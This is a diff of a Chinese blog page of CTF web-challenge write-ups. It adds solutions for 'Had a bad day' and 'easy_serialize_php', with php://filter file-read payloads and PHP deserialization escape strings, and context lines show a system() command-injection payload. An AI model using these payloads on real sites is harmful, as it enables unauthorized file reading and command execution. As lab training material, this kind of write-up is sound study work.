@@ -73,17 +73,6 @@
   
   <li class="hide-on-med-and-down nav-item">
     
-    <a href="/categories" class="waves-effect waves-light">
-      
-      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
-      
-      <span>分类</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
     <a href="/archives" class="waves-effect waves-light">
       
       <i class="fas fa-archive" style="zoom: 0.6;"></i>
@@ -170,17 +159,6 @@
 			    <i class="fa-fw fas fa-tags"></i>
 			
 			标签
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/categories" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-bookmark"></i>
-			
-			分类
 		</a>
           
         </li>
@@ -463,7 +441,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4.6k
+                    5k
                 </div>
                 
 
@@ -739,7 +717,10 @@ It is now 一 5月 5 05:16:04 GMT 2020</code></pre>
 <h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p><strong>难度：易</strong></p>
 <p><strong>考点：php://filter伪协议</strong></p>
 <p>点击tips发现url变成了：<code>buuoj.cn/?file=flag.php</code>，flag应该是被注释掉了。伪协议读取即可。</p>
-<pre><code>?file=php://filter/convert.base64-encode/resource=flag.php</code></pre><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>难度：易</p>
+<pre><code>?file=php://filter/convert.base64-encode/resource=flag.php</code></pre><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p><strong>难度：易</strong></p>
+<p><strong>考点：伪协议</strong></p>
+<p>要求是必须要有规定的字符串，我们只需要套一层就可以读取了。</p>
+<pre><code>php://filter/read=convert.base64-encode/woofers/resource=flag</code></pre><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>难度：易</p>
 <p>考点：data&amp;filter伪协议，简单php反序列化</p>
 <p>打开题目，给出源码。</p>
 <pre><code class="php"> &lt;?php  
@@ -876,7 +857,17 @@ echo serialize($a);
 <pre><code>func=\system&amp;p=cat $(find / -name flag*)</code></pre><p>但是。。。BUU上不行，我也不知道为什么，查了一下之前确实可以233</p>
 <p>那就老老实实搞链子吧，毕竟unserialize函数没有被禁，挺简单的，没什么过滤</p>
 <p>payload：</p>
-<pre><code>O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func";s:6:"system";}</code></pre><h2 id="0CTF-piapiapia"><a href="#0CTF-piapiapia" class="headerlink" title="0CTF piapiapia"></a>0CTF piapiapia</h2><p><strong>难度：中等</strong></p>
+<pre><code>O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func";s:6:"system";}</code></pre><h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><p><strong>难度：简单</strong></p>
+<p><strong>考点：PHP反序列化</strong></p>
+<p><strong>auto_append_file：</strong>其实有点像require(),这里点明了flag所在文件：d0g3_f1ag.php</p>
+<p>1.auto_prepend_file—-指定在每个PHP页面执行前所要执行的代码。</p>
+<p>2.auto_append_file—-指定在每个PHP页面执行完成后所要执行的代码。</p>
+<ul>
+<li>过滤函数filter()是对serialize($_SESSION)进行过滤，滤掉一些关键字 正常传img参数进去会被sha1加密，我们应该用别的方法控制$_SESSION中的参数。 本来挺好的序列化的字符串，按某种去掉了一些关键字，本身就不对，本身就涉及到可能破坏原有结构而无法正常反序列化的问题。这里是利用反序列化长度逃逸控制了img参数。之前有一道题目是关键字替换导致字符串长度变长，把后面的原有参数挤出去了， 本题是关键字被置空导致长度变短，后面的值的单引号闭合了前面的值的单引号，导致一些内容逃逸。。 extract后覆盖了两个没用的属性，但是后面又强制加了一个我们不可控的img属性</li>
+</ul>
+<p>利用截断构造payload对<code>d0g3_f1ag.php</code>进行读取:</p>
+<pre><code>_SESSION[phpflag]=;s:7:"xxxxxxx";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}</code></pre><p>再读真正的flag位置：</p>
+<pre><code>_SESSION[phpflag]=;s:14:"phpflagphpflag";s:7:"xxxxxxx";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}</code></pre><h2 id="0CTF-piapiapia"><a href="#0CTF-piapiapia" class="headerlink" title="0CTF piapiapia"></a>0CTF piapiapia</h2><p><strong>难度：中等</strong></p>
 <p><strong>考点：PHP序列化逃逸</strong></p>
 <h2 id="-3"><a href="#-3" class="headerlink" title=""></a></h2><h2 id="The-mystery-of-ip"><a href="#The-mystery-of-ip" class="headerlink" title="The mystery of ip"></a>The mystery of ip</h2><p><strong>难度：易</strong></p>
 <p><strong>考点：smarty SSTi</strong></p>
@@ -1102,7 +1093,7 @@ h.hexdigest()
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://hackyangtuo.top/posts/ab7.html">https://hackyangtuo.top/posts/ab7.html</a>
+                    <a href="https://www.hackyangtuo.top/posts/ab7.html">https://www.hackyangtuo.top/posts/ab7.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
